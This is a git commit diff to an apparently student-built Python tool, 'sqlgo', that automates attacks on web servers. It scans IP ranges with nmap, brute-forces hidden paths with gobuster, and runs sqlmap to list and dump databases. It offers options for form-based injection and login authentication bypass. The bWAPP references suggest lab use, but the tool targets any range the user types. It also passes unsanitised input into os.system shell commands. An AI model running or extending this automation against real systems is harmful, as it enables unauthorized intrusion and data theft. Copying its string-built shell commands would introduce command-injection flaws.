35942a81d00f7d0fac5d9c89d13a6020c2eb8bcf
root <root@localhost.localdomain>
2019-04-24 20:10:26 -0400

    3 examples and 1st check for sqlmap

--- source.py
+++ source.py
@@ -17,31 +17,33 @@ def nmap_scan():
     ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")    
 	
     nm = nmap.PortScanner()
-    nm.scan(hosts = ip_addr, arguments = '--open -n -sV-p80,443')
+    nm.scan(hosts = ip_addr, arguments = '--open -n -sV -p80,443')
     num = 0
     
     #exit if nothing scanned
     if  len(nm.all_hosts()) == 0:
-        sys.exit(0)
+        print()
+        response = input("No hosts found. Please use another IP range or press 'q' to quit: ")
+        if response == "c":
+            exit(0)
+        else:
+            nm = nmap.PortScanner()
+            nm.scan(hosts = response, arguments = '--open -n -sV -p80,443')
+            num = 0  
 
     for host in nm.all_hosts():
         num+= 1
         print ('---------------------------')
         print ([num] ,host, '- state:', nm[host].state())
-        print ('port 135:', nm[host]['tcp'][135]['state'],'port 139:', nm[host]['tcp'][139]['state'])
     print()
     
     print('Now, lets look for hidden paths in the webserver that could be exploitable')    
-    temp = int(input('Type the number of the IP that you would like to attack ')) - 1
+    webserver = input('Type the number of the IP that you would like to attack: ')
     
-    webserver = nm.all_hosts()[temp]
     print(webserver)
     return webserver
+
 """
-
-
-
-
 def nmap_scan():
     ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")
     cmd = "nmap -n --open " + ip_addr + " -p80,443  -sV > /usr/share/sqlgo/nmapoutput.txt"
@@ -87,43 +89,100 @@ def gobuster(webserver):
     except KeyboardInterrupt:
         print ("Gobuster failed. Run script again")
 
+def getHiddenPath():
+    hidden_path = input("What hidden path would you like to SQL inject? ")
+    return hidden_path
+
 def inject_options_output():
-    options = ["Exploit vulnerable input parameters", "Exploit form-based SQL Injection"]
+    options = ["Exploit vulnerable input parameters", "Exploit form-based SQL Injection", "Bypass Login Authentication"]
     print("\nWhich option would you like to use in SQLMap?\n")
     counter = 1
     for option in options:
         print(counter, option, "\n")
         counter += 1
-    print("\nPlease type the corresponding type number: ")
+    option = input("\nPlease type the corresponding type number: ")
+    option_chosen = int(option)
+    return option_chosen
 
-def sqlmap(webserver):
+def sqlmap(webserver, hidden_path, option_chosen):
 
+    """
     option2 = " "
     if(webserver == "10.0.2.15/bWAPP"):
         os.system("wget --save-cookies /usr/share/sqlgo/cookies.txt --keep-session-cookies  --post-data 'login=bee&password=bug&security_level=0&form=submit'      http://10.0.2.15/bWAPP/login.php 1>wget.txt 2>wget.txt")
         cookie = parseCookie()
         option2 = "--cookie=\"PHPSESSID=" + cookie + ";security_level=0\" " + " --data=\"login=test&password=test&form=submit\""
+    """
+    result = ""
 
-    injection_options = ["?id=1&Submit=Submit#\"", option2]
-    hidden_path = input("What hidden path would you like to SQL inject? ")
-    inject_options_output()
-    option_chosen = int(input())
+    if option_chosen == 1: 
+        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "/" + "?id=1&Submit=Submit#\""
 
-    if option_chosen == 1:
-        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "/" + injection_options[0]
+    if option_chosen == 2 or option_chosen == 3:
+        curlcmd = "curl " + webserver + hidden_path + " > /usr/share/sqlgo/curloutput.txt"
+        os.system(curlcmd)
+        paramstring = parseCurl()
+        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "\" " + "--data=" + paramstring
 
-    if option_chosen == 2:
-        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "\" " + injection_options[1] 
+    cmd = base_cmd + " --dbs" + " > /usr/share/sqlgo/sqlmapoutput.txt"
 
-    cmd = base_cmd + " --dbs"
-
-    print(cmd)    
+    #print(cmd)    
     try:
         os.system(cmd)
+        resultstr = parseSqlMap()
+        if resultstr == "error":
+            response = input("Press 'q' to quit or anything to choose another SQLMap option: ")
+            if response == 'q':
+                exit(0)
+            else:
+                return "error"
     except KeyboardInterrupt:
         print ("SQLMap failed. Run script again")
     return base_cmd
 
+
+
+def parseSqlMap():
+    s = open("/usr/share/sqlgo/sqlmapoutput.txt", "r")
+    print()
+    print("Available Databases:")
+    result = []
+    resultstr = ""
+    line_iter = iter(s)
+    for line in line_iter:
+        line = line.rstrip()
+        if "[*]" in line:
+            result.append(line)
+    
+    if(len(result) == 2):
+        resultstr = "error"
+        print("This path does not seem to be injectible by the option chosen.")
+        return resultstr  
+    
+    for i in range(1, len(result)-1):
+        print(result[i])
+    print()
+
+
+def parseCurl():
+    s = open("/usr/share/sqlgo/curloutput.txt", "r")
+    result = []
+    resultstr = "\""
+    line_iter = iter(s)
+    for line in line_iter:
+        if "name" in line:
+            s = line.split("\"")
+            for word in s:
+                if "name=" in word:
+                    index = s.index(word)
+                    index += 1
+                    param = s[index]
+                    result.append(param)
+
+    for param in result:
+        resultstr = resultstr + param + "=1&"
+    resultstr += "\""
+    return resultstr
 
 def parseCookie():
     s = open("/usr/share/sqlgo/cookies.txt", "r")
@@ -177,7 +236,12 @@ def execute_sqlgo():
 
     webserver = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
     gobuster(webserver)
-    base_cmd = sqlmap(webserver)
+    hidden_path = getHiddenPath()
+    option_chosen = inject_options_output()
+    base_cmd = sqlmap(webserver, hidden_path, option_chosen)
+    while base_cmd == "error":
+        option_chosen = inject_options_output()
+        base_cmd = sqlmap(webserver, hidden_path, option_chosen)
     database = database_search(base_cmd)
     table_dump(base_cmd, database)
 
